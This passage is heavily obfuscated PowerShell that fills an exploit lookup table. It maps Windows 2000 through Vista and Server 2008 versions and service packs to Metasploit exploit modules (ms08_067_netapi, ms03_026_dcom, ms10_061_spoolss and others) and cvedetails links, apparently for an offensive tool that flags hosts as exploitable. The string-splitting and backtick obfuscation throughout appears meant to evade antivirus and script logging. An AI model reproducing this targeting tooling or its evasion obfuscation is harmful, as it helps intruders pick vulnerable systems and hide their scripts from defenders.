        ${Ta`Bl`EEX`pLo`iTs}."COL`UmNS".("{1}{0}" -f 'd','Ad').Invoke(("{3}{2}{1}{0}" -f 'dule','Mo','sf','M')) | &("{1}{0}"-f 'ut-Null','O')  
        ${ta`BLE`exPLo`i`TS}."CO`lumNS".("{1}{0}"-f 'dd','A').Invoke('CVE') | &("{0}{1}" -f'Out-Nul','l')
        
        
        ${tA`B`leExPLOItS}."RO`Ws".("{1}{0}" -f'd','Ad').Invoke(("{2}{0}{1}" -f 'dows ','7','Win'),"",("{0}{5}{6}{3}{2}{4}{7}{9}{8}{1}"-f'e','lss','ndows/','i','smb','x','ploit/w','/ms','0_061_spoo','1'),("{2}{0}{5}{1}{9}{7}{6}{3}{8}{4}" -f'www.cv','tail','http://','10-27','9','ede','/20','cve','2','s.com/')) | &("{0}{1}{2}"-f'Out-','N','ull')  
        ${Ta`BleeX`Ploi`TS}."r`owS".("{1}{0}"-f 'd','Ad').Invoke(("{1}{3}{0}{2}"-f 'ow','Wi','s Server 2000','nd'),("{2}{3}{0}{1}"-f'Pack ','1','Serv','er '),("{4}{3}{0}{6}{5}{2}{1}" -f'o','m','ms03_026_dco','l','exp','ows/dcerpc/','it/wind'),("{1}{5}{11}{2}{8}{7}{4}{9}{10}{0}{6}{3}"-f '03','htt','//ww','2/','.com','p','5','ails','w.cvedet','/cve/','2003-',':')) | &("{2}{0}{1}" -f 't','-Null','Ou')  
        ${t`A`BLEeXpl`OITS}."rO`WS".("{0}{1}" -f 'Ad','d').Invoke(("{4}{1}{3}{2}{0}"-f'0','n','00','dows Server 2','Wi'),("{0}{1}{3}{2}"-f 'Serve','r P',' 1','ack'),("{2}{4}{1}{3}{5}{0}" -f 'mq','/windows/dcerpc/ms','e','05','xploit','_017_ms'),("{3}{4}{6}{0}{10}{7}{1}{9}{2}{8}{5}" -f'cvedetai','/','05','http:','//w','0059','ww.','.com/cve','-','20','ls')) | &("{1}{0}{2}"-f't-Nu','Ou','ll')  
        ${T`A`BlE`EXpl`oITS}."rO`ws".("{1}{0}"-f 'dd','A').Invoke(("{2}{4}{3}{0}{1}"-f's Server 200','0','W','ndow','i'),("{0}{2}{1}"-f'Server Pa','k 1','c'),("{6}{7}{2}{1}{5}{3}{4}{0}" -f 'tdll_webdav','s/iis/ms03_0','w','_','n','07','exp','loit/windo'),("{10}{11}{6}{5}{7}{8}{3}{4}{0}{1}{9}{2}" -f'c','om/c','09','ai','ls.','www.','p://','cved','et','ve/2003-01','ht','t')) | &("{1}{0}{2}" -f '-Nu','Out','ll')  
        ${Ta`BlEExp`Lo`I`Ts}."Ro`Ws".("{0}{1}" -f 'A','dd').Invoke(("{1}{0}{5}{3}{2}{4}"-f 'e','Windows S',' 200','ver','0','r'),("{2}{0}{1}{3}"-f'erve','r Pack','S',' 1'),("{2}{0}{6}{1}{5}{8}{7}{3}{4}" -f 'xp','ow','e','s/ms04_045_w','ins','s/w','loit/wind','n','i'),("{8}{2}{5}{4}{3}{6}{0}{7}{1}" -f'.c','2004-1080/','www.c','tai','e','ved','ls','om/cve/','http://')) | &("{2}{0}{1}" -f '-N','ull','Out')  
        ${tA`Bl`EeXPlo`ITS}."RO`wS".("{0}{1}" -f'Ad','d').Invoke(("{2}{5}{4}{3}{0}{1}" -f'rver 20','00','Windo','Se',' ','ws'),("{2}{1}{3}{0}"-f '2','rvice Pa','Se','ck '),("{2}{6}{1}{3}{5}{0}{4}" -f'_dc','d','ex','cerpc/m','om','s03_026','ploit/windows/'),("{9}{6}{0}{1}{2}{8}{5}{4}{3}{7}"-f 'ils.com/','c','ve','5','-03','3','/www.cvedeta','2/','/200','http:/')) | &("{0}{1}{2}"-f 'O','u','t-Null')  
        ${TAbLEEX`plo`I`TS}."ro`Ws".("{0}{1}" -f'Ad','d').Invoke(("{6}{3}{4}{0}{1}{5}{2}"-f'er ','2','00','i','ndows Serv','0','W'),("{3}{2}{0}{1}" -f'vice Pa','ck 2','er','S'),("{6}{5}{1}{2}{7}{0}{4}{3}"-f'c/','it/windows/','dcer','17_msmq','ms05_0','xplo','e','p'),("{9}{8}{2}{0}{6}{3}{1}{5}{4}{7}"-f'ww.cvede','om/cve/20','w','c','5-005','0','tails.','9','//','http:')) | &("{2}{1}{0}"-f'Null','t-','Ou')  
        ${taB`LEeXPLoI`TS}."Ro`ws".("{0}{1}" -f 'Ad','d').Invoke(("{1}{3}{2}{0}" -f'r 2000','Wi','ows Serve','nd'),("{1}{2}{0}{3}" -f 'ce Pac','Ser','vi','k 2'),("{6}{1}{5}{4}{3}{8}{0}{2}{7}" -f'e','loit/w','bda','007_ntd','s/iis/ms03_','indow','exp','v','ll_w'),("{9}{7}{0}{3}{6}{4}{1}{5}{8}{2}"-f'://www.','e','0109','cve','ls.com/cv','/2','detai','p','003-','htt')) | &("{0}{1}"-f 'Out-Nu','ll')  
        ${tAB`leE`XP`lO`iTs}."R`oWS".("{0}{1}"-f 'A','dd').Invoke(("{3}{2}{1}{0}"-f '000',' 2','ows Server','Wind'),("{2}{1}{3}{0}"-f 'Pack 2','c','Servi','e '),("{5}{0}{6}{1}{7}{8}{4}{2}{3}"-f 't','dows','011_l','sass','_','exploi','/win','/smb/','ms04'),("{2}{4}{7}{9}{6}{5}{3}{1}{0}{8}" -f '003-0533','2','h','/cve/','ttp','om','.cvedetails.c',':/','/','/www')) | &("{0}{1}"-f 'Out-','Null')  
        ${tAB`LEE`xP`lOITs}."r`OwS".("{0}{1}" -f 'Ad','d').Invoke(("{4}{0}{2}{3}{5}{1}"-f'ws Server ','0','2','0','Windo','0'),("{2}{1}{3}{0}" -f '2','ervice Pac','S','k '),("{4}{7}{2}{3}{6}{9}{8}{1}{5}{0}{10}" -f'win','4_045','/','windo','explo','_','ws/wins','it','s0','/m','s'),("{2}{10}{5}{1}{9}{8}{4}{0}{7}{3}{6}" -f 'e','w.cve','http:','2004-1','om/cv','ww','080/','/','c','details.','//')) | &("{1}{0}{2}" -f 't','Ou','-Null')  
        ${t`ABl`EeX`plo`ITS}."r`ows".("{1}{0}"-f 'd','Ad').Invoke(("{2}{1}{3}{0}" -f'er 2000','i','W','ndows Serv'),("{4}{2}{1}{0}{3}" -f'e','c','rvi',' Pack 3','Se'),("{0}{2}{8}{7}{4}{5}{1}{3}{6}"-f'e','erpc/ms','xp','0','ows/d','c','3_026_dcom','it/wind','lo'),("{8}{1}{7}{10}{9}{12}{11}{6}{4}{3}{2}{5}{0}" -f '3-0352/','//www.','/2','cve','m/','00','co','cve','http:','i','deta','s.','l')) | &("{0}{2}{1}" -f'Ou','Null','t-')  
        ${TablE`ex`PLoI`Ts}."R`ows".("{1}{0}"-f'd','Ad').Invoke(("{3}{4}{1}{2}{0}"-f'0','Server ','200','W','indows '),("{2}{1}{0}{3}{4}" -f 'ic','v','Ser','e P','ack 3'),("{0}{2}{5}{1}{4}{3}"-f 'explo','/ms05','it/windows/','q','_017_msm','dcerpc'),("{7}{3}{8}{2}{9}{10}{1}{0}{6}{4}{5}" -f 'm/cve/','co','.cvedet','ttp','5-0','059','200','h','://www','ai','ls.')) | &("{1}{0}" -f't-Null','Ou')  
        ${ta`BlEE`xplOI`TS}."ro`Ws".("{0}{1}"-f'Ad','d').Invoke(("{2}{3}{1}{4}{0}" -f '2000','erver','Window','s S',' '),("{1}{2}{3}{0}" -f '3','S','e','rvice Pack '),("{4}{7}{5}{3}{2}{0}{1}{6}"-f '07','_','03_0','s','exploit/windo','/m','ntdll_webdav','ws/iis'),("{8}{7}{6}{4}{0}{1}{2}{5}{3}" -f'.cvedetails.c','om/c','ve/2003','109','w','-0','w','://w','http')) | &("{0}{1}{2}" -f 'O','ut-Nu','ll')  
        ${tA`BLeE`x`plOITs}."R`ows".("{0}{1}" -f 'Ad','d').Invoke(("{4}{6}{0}{1}{2}{5}{3}"-f 'dow','s Ser','ver ','0','W','200','in'),("{1}{0}{3}{2}"-f'vic','Ser','ck 3','e Pa'),("{2}{4}{1}{5}{0}{3}" -f'wi','ms04_0','exploit/wind','ns','ows/wins/','45_'),("{5}{0}{1}{3}{6}{2}{4}"-f 'ww.cvedetails.co','m','04-10','/cv','80/','http://w','e/20')) | &("{1}{0}"-f 'ull','Out-N')  
        ${TA`BlEeX`P`LO`ItS}."ro`wS".("{0}{1}"-f'Ad','d').Invoke(("{2}{1}{0}{3}{4}"-f 'ws Se','do','Win','rver ','2000'),("{1}{0}{2}" -f 'Pack ','Service ','4'),("{0}{6}{3}{9}{4}{5}{8}{1}{7}{2}"-f'e','c/','03_026_dcom','t','do','ws/d','xploi','ms','cerp','/win'),("{2}{3}{6}{7}{8}{4}{0}{1}{5}"-f'cve/2003-','0','htt','p://','ls.com/','352/','www.cvede','t','ai')) | &("{1}{2}{0}" -f '-Null','Ou','t')  
        ${T`A`BlEex`PLo`ItS}."RO`Ws".("{1}{0}"-f 'dd','A').Invoke(("{3}{0}{4}{2}{1}"-f' Serve','000','2','Windows','r '),("{2}{1}{0}{3}" -f'ce P','ervi','S','ack 4'),("{3}{2}{1}{5}{4}{0}"-f's05_017_msmq','t','oi','expl','cerpc/m','/windows/d'),("{7}{4}{6}{0}{3}{5}{9}{2}{1}{10}{8}" -f'//','om/cve/20','s.c','www','p','.cvedetai',':','htt','059','l','05-0')) | &("{2}{0}{1}" -f '-Nul','l','Out')  
        ${Ta`BlEExP`loItS}."Ro`Ws".("{1}{0}" -f'dd','A').Invoke(("{1}{4}{2}{3}{0}"-f '00','W','rver',' 20','indows Se'),("{2}{1}{3}{0}" -f' 4','ervice','S',' Pack'),("{8}{6}{3}{7}{0}{2}{1}{5}{4}" -f'pc/ms','_029_msdns_zonen','07','ce','me','a','loit/windows/d','r','exp'),("{8}{7}{3}{0}{5}{4}{2}{1}{9}{6}"-f':/','com/cv','s.','tp','cvedetail','/www.','07-1748','t','h','e/20')) | &("{1}{2}{0}"-f'l','Out-','Nul')  
        ${ta`BleEx`pLO`ITS}."r`oWS".("{0}{1}" -f 'A','dd').Invoke(("{3}{1}{0}{2}" -f'Server 20',' ','00','Windows'),("{4}{1}{0}{2}{3}"-f 'a','ce P','ck ','4','Servi'),("{4}{0}{5}{2}{3}{1}"-f 'indow','sass','/smb/ms','04_011_l','exploit/w','s'),("{1}{9}{5}{8}{7}{6}{2}{10}{4}{3}{0}" -f '/','ht','l','3-0533','e/200','://','cvedetai','.','www','tp','s.com/cv')) | &("{1}{0}{2}" -f'l','Out-Nu','l')  
        ${T`AblE`exPLoI`Ts}."RO`ws".("{1}{0}"-f'd','Ad').Invoke(("{2}{1}{3}{0}"-f '2000','indows ','W','Server '),("{2}{1}{0}"-f ' 4','rvice Pack','Se'),("{4}{2}{5}{6}{3}{1}{0}" -f 'tapi','_ne','plo','/smb/ms06_040','ex','it/window','s'),("{1}{4}{0}{7}{5}{2}{6}{3}{8}"-f 't','http://www.c','om/cve','00','vede','s.c','/2','ail','6-3439')) | &("{1}{0}{2}"-f'l','Out-Nu','l')  
        ${Ta`Ble`eXpL`oits}."Ro`WS".("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}{5}{2}{3}{4}" -f 'dows','Win','rver 20','0','0',' Se'),("{0}{1}{3}{2}"-f 'S','ervice Pa','4','ck '),("{2}{4}{0}{6}{5}{1}{3}"-f's/','_nwa','exploit/win','pi','dow','6','smb/ms06_06'),("{9}{0}{10}{8}{5}{4}{7}{2}{3}{6}{1}" -f 'tp:','4688','c','v','s','l','e/2006-','.com/','vedetai','ht','//www.c')) | &("{1}{0}"-f'-Null','Out')  
        ${T`AbLeEX`P`LoiTS}."R`Ows".("{0}{1}"-f'A','dd').Invoke(("{1}{3}{0}{2}" -f 'rver 200','Wi','0','ndows Se'),("{0}{1}{4}{2}{3}" -f'Servic','e ','ack ','4','P'),("{4}{2}{7}{3}{5}{6}{9}{8}{1}{10}{0}" -f'vc','wk','loit/wi','s','exp','mb/','ms','ndows/','070_','06_','ss'),("{0}{5}{7}{1}{4}{2}{6}{3}"-f'ht','ved','ta','2006-4691','e','tp://','ils.com/cve/','www.c')) | &("{2}{1}{0}" -f 'l','Nul','Out-')  
        ${TAB`l`ee`XPlOi`TS}."r`OWs".("{0}{1}" -f 'Ad','d').Invoke(("{4}{3}{2}{0}{5}{1}"-f'erv',' 2000','ws S','do','Win','er'),("{0}{1}{3}{2}" -f 'S','ervi','k 4','ce Pac'),("{5}{6}{4}{0}{1}{8}{7}{2}{3}"-f 'ow','s/s','0','67_netapi','ind','expl','oit/w','_','mb/ms08'),("{10}{6}{2}{3}{0}{5}{11}{4}{7}{1}{8}{9}" -f'ved','42','w','.c','ve/200','etails','p://ww','8-','5','0','htt','.com/c')) | &("{0}{2}{1}" -f'Ou','ll','t-Nu')  
        ${t`A`BlEE`x`PloiTs}."ro`Ws".("{0}{1}"-f'Ad','d').Invoke(("{5}{3}{4}{0}{2}{1}"-f'd','2000','ows Server ','i','n','W'),("{3}{0}{1}{2}" -f'i','ce Pac','k 4','Serv'),("{2}{6}{1}{0}{8}{4}{3}{7}{5}"-f 'wi','/windows/','expl','_','4_045','ins','oit','w','ns/ms0'),("{10}{7}{12}{9}{8}{11}{5}{1}{6}{3}{0}{4}{2}"-f'00','m/c','0/','2','4-108','co','ve/','ttp','.cvedetails','//www','h','.',':')) | &("{0}{1}"-f 'Out-','Null')  
        ${T`ABL`eExPlO`i`TS}."Ro`Ws".("{0}{1}"-f'Ad','d').Invoke(("{0}{2}{1}{3}{4}"-f 'W','Ser','indows ','ver 20','00'),"",("{0}{5}{4}{7}{6}{1}{2}{8}{3}"-f'exploit/','pc','/m','_026_dcom','ows/','wind','r','dce','s03'),("{5}{12}{6}{3}{0}{1}{2}{4}{11}{9}{7}{10}{8}"-f've','det','a','c','i','http://','ww.','/','03-0352/','com/cve','20','ls.','w')) | &("{0}{2}{1}"-f'Out-Nu','l','l')  
        ${TAbLeeXPl`o`iTs}."Ro`Ws".("{1}{0}" -f 'dd','A').Invoke(("{1}{3}{0}{2}"-f' Server','Win',' 2000','dows'),"",("{0}{2}{6}{3}{7}{4}{1}{5}"-f 'exp','05_017_msm','l','wi','s/dcerpc/ms','q','oit/','ndow'),("{3}{2}{4}{6}{5}{7}{1}{0}" -f'0059','-','vede','http://www.c','t','0','ails.com/cve/20','5')) | &("{0}{1}{2}"-f'Out','-Nu','ll')  
        ${tAbLeE`Xpl`OIts}."rO`Ws".("{0}{1}"-f'A','dd').Invoke(("{2}{3}{1}{0}"-f'r 2000','Serve','Wi','ndows '),"",("{10}{3}{2}{5}{0}{8}{6}{9}{4}{1}{7}{11}"-f 'indows','e','o','xpl','07_ntdll_w','it/w','03','bd','/iis/ms','_0','e','av'),("{5}{4}{1}{7}{3}{0}{2}{6}" -f'3-','://www.cvedetails.co','01','0','p','htt','09','m/cve/20')) | &("{2}{0}{1}" -f 't-Nu','ll','Ou')  
        ${tAbLeE`xp`lOITs}."rO`wS".("{0}{1}"-f'A','dd').Invoke(("{0}{3}{2}{5}{4}{1}" -f 'W','2000','dows','in','ver ',' Ser'),"",("{6}{5}{2}{3}{4}{7}{0}{1}" -f'05_039_pn','p','windo','w','s/smb','/','exploit','/ms'),("{4}{5}{7}{2}{3}{6}{1}{0}" -f '05-1983','e/20','ail','s.com','htt','p://www.cved','/cv','et')) | &("{0}{2}{1}" -f'Out','ll','-Nu')  
        ${taB`LEEx`plO`I`TS}."R`ows".("{1}{0}"-f'd','Ad').Invoke(("{0}{3}{1}{2}" -f'W','r',' 2000','indows Serve'),"",("{1}{4}{0}{3}{2}{5}"-f'o','exp','s/','it/window','l','wins/ms04_045_wins'),("{10}{8}{5}{3}{1}{7}{4}{2}{0}{9}{6}" -f '/200','ails.','e','et','om/cv','www.cved','80/','c','p://','4-10','htt')) | &("{2}{1}{0}" -f '-Null','t','Ou')  
        ${tabl`eE`xplO`itS}."R`owS".("{1}{0}"-f'dd','A').Invoke(("{3}{0}{2}{1}" -f'dows Serv','2003','er ','Win'),("{4}{1}{2}{0}{3}"-f 'Pack ','erv','er ','1','S'),("{1}{5}{4}{2}{0}{6}{3}{7}" -f's07_0','explo','rpc/m','msdns_zone','ndows/dce','it/wi','29_','name'),("{1}{3}{2}{5}{6}{0}{4}{7}"-f '2','h','/ww','ttp:/','007-','w.cvedetails.c','om/cve/','1748')) | &("{2}{0}{1}" -f 'u','ll','Out-N')  
        ${tA`BlEexPlO`i`Ts}."ro`wS".("{1}{0}"-f 'dd','A').Invoke(("{3}{2}{4}{0}{1}{5}"-f 'Ser','ver 2','in','W','dows ','003'),("{2}{0}{3}{1}{4}" -f 'rver Pa','k ','Se','c','1'),("{1}{2}{3}{6}{0}{4}{5}"-f'06_040_net','ex','p','loi','ap','i','t/windows/smb/ms'),("{7}{10}{2}{1}{6}{11}{9}{0}{3}{4}{5}{8}" -f '/c','ail','www.cvedet','v','e/','20','s.','htt','06-3439','m','p://','co')) | &("{2}{0}{1}"-f '-','Null','Out')  
        ${tA`BLeex`pLOits}."r`Ows".("{0}{1}" -f'Ad','d').Invoke(("{1}{4}{5}{0}{3}{2}{6}"-f 'Se','W',' 200','rver','in','dows ','3'),("{0}{3}{1}{2}" -f'S','er',' Pack 1','erv'),("{0}{3}{4}{7}{1}{8}{2}{6}{5}" -f 'exploit/win','06_','6_','dows/','sm','api','nw','b/ms','06'),("{3}{11}{6}{5}{10}{7}{8}{1}{2}{9}{0}{4}"-f '06-46','ails','.co','h','88','://w','p','w.cve','det','m/cve/20','w','tt')) | &("{0}{1}"-f 'Out-','Null')  
        ${tAbl`eEXPloI`TS}."R`ows".("{1}{0}" -f 'd','Ad').Invoke(("{3}{4}{1}{5}{6}{0}{2}" -f'Server 200','ndo','3','W','i','w','s '),("{3}{2}{0}{1}"-f 'Pack ','1','er ','Serv'),("{2}{1}{4}{0}{5}{3}"-f'do','t','exploi','smb/ms08_067_netapi','/win','ws/'),("{3}{5}{8}{7}{2}{1}{0}{9}{6}{4}{10}" -f'/c','.com','ls','http://ww','-','w.cve','2008','tai','de','ve/','4250')) | &("{0}{2}{1}" -f'Ou','ll','t-Nu')  
        ${TA`BLEeX`p`lOITs}."r`oWS".("{0}{1}"-f'Ad','d').Invoke(("{1}{4}{2}{0}{3}"-f ' Server 200','Wi','ws','3','ndo'),("{1}{2}{3}{0}" -f'ack 1','Ser','v','er P'),("{8}{6}{5}{7}{3}{2}{1}{0}{4}{9}" -f'/wins/ms','ndows','wi','t/','0','l','p','oi','ex','4_045_wins'),("{8}{5}{3}{9}{2}{6}{0}{4}{7}{1}" -f 'ails.c','cve/2004-1080/','.cve','p://w','om','tt','det','/','h','ww')) | &("{2}{0}{1}"-f'-N','ull','Out')  
        ${T`A`BLeExpl`o`ItS}."r`ows".("{0}{1}"-f 'Ad','d').Invoke(("{2}{0}{3}{1}" -f'rver ','03','Windows Se','20'),("{4}{0}{3}{1}{2}"-f'ervi','ac','k 2','ce P','S'),("{5}{10}{7}{2}{9}{1}{3}{4}{8}{6}{0}" -f'_zonename','ms','/dc','0','7_0','expl','s','/windows','29_msdn','erpc/','oit'),("{7}{9}{10}{6}{11}{1}{3}{4}{5}{8}{2}{0}"-f'748','ta','07-1','ils.c','om/','cv','.','htt','e/20','p:','//www','cvede')) | &("{0}{1}"-f 'Out-Nu','ll')  
        ${TA`B`LeexpLo`i`Ts}."r`OwS".("{0}{1}" -f 'A','dd').Invoke(("{3}{4}{6}{5}{2}{1}{0}" -f' 2003','r',' Serve','Wi','nd','s','ow'),("{0}{2}{1}" -f'Se',' 2','rvice Pack'),("{1}{6}{4}{0}{2}{3}{5}"-f'ws/','exploit','smb/ms08_','067_ne','ndo','tapi','/wi'),("{7}{6}{1}{4}{2}{9}{0}{3}{8}{5}"-f '/cve/200','tp:','cvedetails.c','8','//www.','0','t','h','-425','om')) | &("{1}{0}{2}"-f 'ut-N','O','ull')  
        ${tablEE`xPlOI`Ts}."r`Ows".("{0}{1}"-f 'Ad','d').Invoke(("{0}{2}{4}{3}{1}"-f 'W','3','indows Serv','0','er 20'),("{1}{2}{3}{0}"-f'ack 2','S','er','vice P'),("{7}{5}{6}{3}{1}{4}{8}{2}{0}"-f'spoolss','m','0_061_','indows/s','b/m','loi','t/w','exp','s1'),("{4}{7}{8}{3}{6}{9}{1}{2}{0}{5}"-f'-272','201','0','ils.com/','http','9','cv','://www.c','vedeta','e/')) | &("{1}{2}{0}" -f'ull','O','ut-N')  
        ${T`ABlEExpLO`Its}."Ro`Ws".("{0}{1}" -f 'A','dd').Invoke(("{1}{2}{3}{0}"-f'ver 2003','W','in','dows Ser'),"",("{1}{0}{2}{4}{5}{3}{6}" -f 'o','expl','it/windows/d','/ms03_02','ce','rpc','6_dcom'),("{6}{0}{1}{5}{2}{4}{3}"-f'ttp://w','ww.cvedet','com/cv','/2003-0352/','e','ails.','h')) | &("{2}{1}{0}" -f'll','t-Nu','Ou')  
        ${TA`BLe`e`xpLoiTS}."r`OwS".("{1}{0}" -f'dd','A').Invoke(("{3}{4}{1}{5}{0}{2}" -f'0','ver','03','Windows Se','r',' 2'),"",("{6}{0}{2}{1}{5}{7}{4}{3}{9}{8}" -f'loit/windows/','b','sm','0_','4','/m','exp','s06_0','etapi','n'),("{0}{3}{4}{10}{5}{2}{7}{1}{6}{9}{8}"-f 'http:','00','ls.com/cve','//','www.c','ai','6-','/2','39','34','vedet')) | &("{1}{0}" -f 'l','Out-Nul')  
        ${tABlEEX`PL`OiTS}."r`ows".("{1}{0}"-f 'd','Ad').Invoke(("{6}{4}{3}{0}{5}{2}{1}" -f'rver','03','20','ws Se','indo',' ','W'),"",("{0}{3}{1}{2}{6}{5}{9}{7}{8}{4}"-f 'expl','w','i','oit/','i','/sm','ndows','a','p','b/ms08_067_net'),("{6}{0}{5}{3}{7}{1}{2}{4}"-f 'tp://w','e/','2008-4','.cvedetails.com/c','250','ww','ht','v')) | &("{1}{2}{0}"-f 'ull','O','ut-N')  
        ${taBLee`X`ploITs}."r`Ows".("{1}{0}"-f 'd','Ad').Invoke(("{0}{4}{3}{2}{1}"-f'Windo','r 2003','rve','Se','ws '),"",("{3}{0}{1}{2}{5}{4}" -f '/ms0','4_045','_','exploit/windows/wins','ins','w'),("{3}{5}{6}{4}{2}{1}{0}{7}"-f '108','2004-','ve/','http:','om/c','//www.cvedetail','s.c','0/')) | &("{1}{2}{0}" -f 'Null','Ou','t-')  
        ${tAb`LEEXP`lo`ItS}."r`oWS".("{1}{0}"-f 'dd','A').Invoke(("{5}{2}{1}{4}{0}{3}"-f' ','ow','d','2003 R2','s Server','Win'),"",("{3}{7}{4}{1}{0}{5}{6}{2}"-f's/','w','3_026_dcom','e','oit/windo','dcerpc/ms','0','xpl'),("{11}{8}{2}{12}{4}{6}{5}{1}{9}{0}{10}{7}{3}" -f'/2','m/','w.cv','/','tail','o','s.c','2','p://ww','cve','003-035','htt','ede')) | &("{1}{0}" -f'll','Out-Nu')  
        ${tABLE`E`XPLOits}."r`oWS".("{0}{1}" -f 'Ad','d').Invoke(("{4}{3}{2}{5}{0}{1}{6}"-f'200','3',' Serve','ws','Windo','r ',' R2'),"",("{3}{9}{7}{2}{6}{1}{8}{5}{4}{0}" -f 's','/smb/ms0','dow','e','s','a','s','in','4_011_ls','xploit/w'),("{7}{5}{8}{1}{4}{6}{0}{3}{2}" -f'0','s.co','533/','3-0','m/cve','p','/20','htt','://www.cvedetail')) | &("{1}{0}{2}" -f'ut-N','O','ull')  
        ${TABl`eeX`plO`i`Ts}."R`OWS".("{0}{1}"-f'Ad','d').Invoke(("{0}{1}{3}{2}" -f 'Windows ','S','2003 R2','erver '),"",("{9}{1}{6}{8}{10}{0}{7}{2}{4}{3}{5}"-f's','loi','04','_net','0','api','t','06_','/windo','exp','ws/smb/m'),("{8}{6}{3}{2}{5}{1}{0}{4}{7}" -f'om/cve','ils.c','/www.cvede','/','/2006','ta','tp:','-3439','ht')) | &("{0}{1}{2}"-f 'O','ut','-Null')  
        ${t`Able`ExPl`oits}."R`oWs".("{0}{1}"-f'A','dd').Invoke(("{2}{1}{4}{3}{0}"-f'003 R2','dows','Win','er 2',' Serv'),"",("{4}{3}{1}{5}{2}{0}{6}"-f'04_045_w','/w','ms','ws','exploit/windo','ins/','ins'),("{10}{6}{2}{5}{1}{8}{7}{3}{0}{4}{9}" -f '/cve/','vedetai','//w','om','2004-1','ww.c','tp:','s.c','l','080/','ht')) | &("{0}{1}{2}"-f'O','ut','-Null')  
        ${taBL`E`Ex`p`LoIts}."r`OwS".("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{1}{3}{4}"-f 'Wi','w','ndo','s',' Server 2008'),("{1}{3}{0}{2}"-f'rvice','S',' Pack 2','e'),("{0}{4}{9}{8}{5}{10}{3}{6}{7}{2}{1}" -f'ex','unc_index','f','_smb2_','pl','9_0','nego','tiate_','windows/smb/ms0','oit/','50'),("{6}{5}{2}{0}{3}{4}{1}" -f 's.com/','3103','etail','cve','/2009-','//www.cved','http:')) | &("{0}{1}" -f 'Out','-Null')  
        ${tAb`leExPLo`Its}."Ro`ws".("{0}{1}" -f 'A','dd').Invoke(("{3}{1}{4}{2}{0}{5}" -f'er 200','ind','s Serv','W','ow','8'),("{3}{1}{0}{2}" -f' Pa','ervice','ck 2','S'),("{10}{5}{1}{4}{9}{6}{8}{7}{0}{3}{2}" -f'1','wi','061_spoolss','0_','n','xploit/','/s','b/ms','m','dows','e'),("{5}{2}{6}{1}{3}{9}{0}{7}{4}{8}"-f 'ls','//','t','www.cve','cve/2010-','h','tp:','.com/','2729','detai')) | &("{0}{1}{2}"-f'Out','-N','ull')  
        ${t`A`BLeE`XPLo`ITs}."R`owS".("{0}{1}"-f'Ad','d').Invoke(("{4}{2}{3}{1}{0}{5}" -f 'er 20',' Serv','n','dows','Wi','08'),"",("{2}{1}{3}{10}{6}{4}{0}{7}{9}{5}{8}"-f'b','xploit/w','e','ind','sm','_ne','/','/ms08','tapi','_067','ows'),("{3}{4}{2}{5}{0}{1}{6}" -f'cvedeta','ils.com/cve/20','//','h','ttp:','www.','08-4250')) | &("{0}{2}{1}" -f 'Out-Nu','l','l')  
        ${tA`Bl`EExp`L`OItS}."Ro`Ws".("{0}{1}" -f'A','dd').Invoke(("{1}{2}{4}{3}{0}"-f 'ver 2008','Windo','ws','Ser',' '),"",("{4}{11}{2}{1}{7}{3}{6}{10}{9}{8}{0}{5}" -f 'tiate_func_ind','ows/','t/wind','mb/ms09_','explo','ex','050_sm','s','go','2_ne','b','i'),("{6}{8}{7}{2}{4}{3}{5}{1}{0}"-f'3','310','cvedetails.','ve/20','com/c','09-','ht','p://www.','t')) | &("{0}{1}{2}" -f'Out-','Nu','ll')  
        ${tab`lEe`X`PLoits}."R`ows".("{0}{1}"-f'Ad','d').Invoke(("{4}{1}{0}{2}{3}" -f' ','ows','Ser','ver 2008','Wind'),"",("{8}{5}{2}{0}{9}{4}{6}{10}{3}{1}{7}" -f's/sm','s','ndow','ool','0_06','xploit/wi','1_s','s','e','b/ms1','p'),("{8}{6}{9}{0}{5}{3}{4}{2}{10}{11}{1}{7}"-f '.c','72','ve/20','ails.c','om/c','vedet','ttp:/','9','h','/www','10-','2')) | &("{0}{1}{2}" -f 'Ou','t-','Null')  
        ${tabLe`EXpLo`its}."RO`wS".("{1}{0}" -f 'd','Ad').Invoke(("{1}{3}{4}{2}{5}{0}" -f '2008 R2','Win',' S','dow','s','erver '),"",("{6}{9}{4}{5}{8}{7}{0}{1}{10}{3}{2}" -f '10_','0','oolss','1_sp','indows','/sm','explo','s','b/m','it/w','6'),("{3}{2}{10}{4}{6}{0}{9}{1}{8}{7}{5}" -f'cve','0','p://www.cvede','htt','ils','29','.com/','7','-2','/201','ta')) | &("{2}{0}{1}"-f 'ul','l','Out-N')  
        ${t`A`BL`EEXPl`OITS}."r`oWS".("{1}{0}"-f 'd','Ad').Invoke(("{0}{3}{1}{2}" -f'Win','ows',' Vista','d'),("{2}{1}{0}" -f'ack 1','er P','Serv'),("{3}{7}{4}{0}{2}{8}{5}{6}{1}" -f 'o','7_netapi','ws','exploit/wi','d','s','08_06','n','/smb/m'),("{8}{3}{5}{0}{6}{2}{7}{9}{1}{4}" -f'/www','cve/2008-','vedet','ttp','4250',':/','.c','ails','h','.com/')) | &("{2}{0}{1}"-f '-N','ull','Out')  
        ${tabLE`E`X`pLoITs}."RO`wS".("{0}{1}"-f 'Ad','d').Invoke(("{1}{3}{4}{2}{0}"-f'ta','Window','s','s ','Vi'),("{0}{1}{2}" -f 'Se','rv','er Pack 1'),("{9}{6}{10}{8}{2}{12}{11}{0}{5}{1}{3}{7}{4}"-f'9_050_smb2_n','iate_fun','ows/smb/','c_','dex','egot','xplo','in','d','e','it/win','s0','m'),("{1}{3}{2}{0}{6}{4}{5}" -f'.c','htt','/www','p:/','ls.com/cve/20','09-3103','vedetai')) | &("{1}{0}"-f'-Null','Out')  
        ${ta`BLE`exP`LoI`Ts}."RO`ws".("{0}{1}"-f 'Ad','d').Invoke(("{3}{0}{1}{4}{2}" -f'n','d','sta','Wi','ows Vi'),("{0}{1}{2}" -f 'Ser','ver P','ack 1'),("{3}{1}{4}{2}{7}{5}{8}{0}{6}" -f '10','lo','w','exp','it/','ows/s','_061_spoolss','ind','mb/ms'),("{8}{11}{5}{10}{2}{1}{3}{0}{9}{7}{6}{4}" -f '01','cve','om/','/2','29','.cvede','7','2','http://w','0-','tails.c','ww')) | &("{0}{1}" -f 'Ou','t-Null')  
